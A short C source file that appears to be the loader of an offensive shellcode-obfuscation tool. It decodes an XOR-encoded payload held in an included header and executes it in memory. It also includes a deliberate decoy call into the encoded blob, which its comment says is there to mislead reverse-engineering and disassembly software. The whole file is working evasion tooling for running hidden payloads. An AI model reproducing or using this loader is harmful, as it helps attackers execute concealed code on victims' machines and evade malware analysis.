#include "runshellcode.h"
#include "codasm_payload.h"

int main()
{
    uint8_t *output = (uint8_t *)malloc(CA_OUTPUT_LEN);
    int32_t res = 0;
    if ((res = decode((uint8_t *)CA_PAYLOAD, CA_PAYLOAD_LEN, output, CA_OUTPUT_LEN, CA_XORKEY)) < 0)
    {
        printf("[!] Failed to decode: %i\n", res);
        return 1;
    }

    if (res == 0x42) // Add de-facto defunct call to encoded blob so bin-rev software follows this path and attempts to disassemble
        ((void (*)(int))CA_PAYLOAD)(0x22);

    run(output, CA_OUTPUT_LEN, FALSE, TRUE);

    return 0;
}